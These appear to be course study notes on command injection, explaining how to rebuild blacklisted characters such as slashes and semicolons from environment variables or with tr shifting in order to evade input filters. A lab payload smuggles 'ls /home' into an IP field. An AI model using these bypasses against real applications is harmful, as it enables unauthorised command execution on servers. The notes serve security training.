## ID
532

## Module
Command Injections

## Kind
notes

## Title
Section 7 — Bypassing Other Blacklisted Characters

## Description
Covers techniques to produce blacklisted characters like `/`, `\`, and `;` without typing them directly, using environment variable slicing and character shifting.

## Tags
command-injection, filter-evasion, character-bypass, env-variables, character-shifting

## Commands
- `echo ${PATH:0:1}` — extract `/` from $PATH (first char)
- `echo ${HOME:0:1}` — extract `/` from $HOME (first char)
- `echo ${LS_COLORS:10:1}` — extract `;` from $LS_COLORS
- `echo %HOMEPATH:~6,-11%` — extract `\` in Windows CMD
- `$env:HOMEPATH[0]` — extract `\` in PowerShell
- `echo $(tr '!-}' '"-~'<<<[)` — character shifting to produce `\` (ASCII 91→92)
- `127.0.0.1%0a%09ls%09${PATH:0:1}home` — full payload: list `/home` with all filters bypassed

## What This Section Covers
When slashes, backslashes, or semicolons are blacklisted, you can still produce them dynamically using environment variable substring extraction (`${VAR:start:length}`) or ASCII character shifting (`tr`). This works because filters check for literal characters in the input, but these techniques generate the character at shell expansion time — after the filter has already passed the input.

## Methodology
1. Identify which character you need that's blacklisted (e.g., `/` to specify a path).
2. Find an environment variable that contains that character — use `printenv` to list all env vars.
3. Use substring syntax `${VAR:offset:length}` to extract just that character:
   - `/` → `${PATH:0:1}` or `${HOME:0:1}` or `${PWD:0:1}`
   - `;` → `${LS_COLORS:10:1}`
4. Substitute it into your payload: `ls /home` becomes `ls%09${PATH:0:1}home`.
5. Combine with previous bypasses: `127.0.0.1%0a%09ls%09${PATH:0:1}home`.

## Multi-step Workflow (optional)
```
# Linux — find useful characters in env vars
printenv
echo ${PATH:0:1}          # → /
echo ${LS_COLORS:10:1}    # → ;

# Windows CMD
echo %HOMEPATH:~6,-11%    # → \

# Windows PowerShell
$env:HOMEPATH[0]           # → \
$env:PROGRAMFILES[10]      # → (space)

# Character shifting (Linux) — shift ASCII by 1
man ascii                              # find char before target
echo $(tr '!-}' '"-~'<<<[)            # [ (91) → \ (92)
echo $(tr '!-}' '"-~'<<<:)            # : (58) → ; (59)
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Find the user in `/home` | (answered correctly) | Payload `127.0.0.1%0a%09ls%09${PATH:0:1}home` in Burp Repeater |

## Key Takeaways
- Filters check the literal input string — characters generated at shell expansion time bypass them entirely.
- `${PATH:0:1}` is the most reliable way to get `/` since `$PATH` always starts with `/` on any Linux system.
- `printenv` is your recon tool — scan all env vars for the character you need, then slice it out.
- Character shifting with `tr` is a universal fallback — you can produce any printable ASCII character by shifting from its neighbor.
- The same concepts apply on Windows using `%VAR:~start,length%` (CMD) or `$env:VAR[index]` (PowerShell).

## Gotchas
- `${LS_COLORS:10:1}` depends on the target having `LS_COLORS` set — it may not exist on minimal systems. Always have a backup like `${PATH:0:1}` for `/`.
- Character shifting with `tr` uses subshell expansion `$(...)` — if `$` or parentheses are also blacklisted, this won't work.
- On Windows, CMD and PowerShell use different syntax for env var slicing — know which shell your target runs.
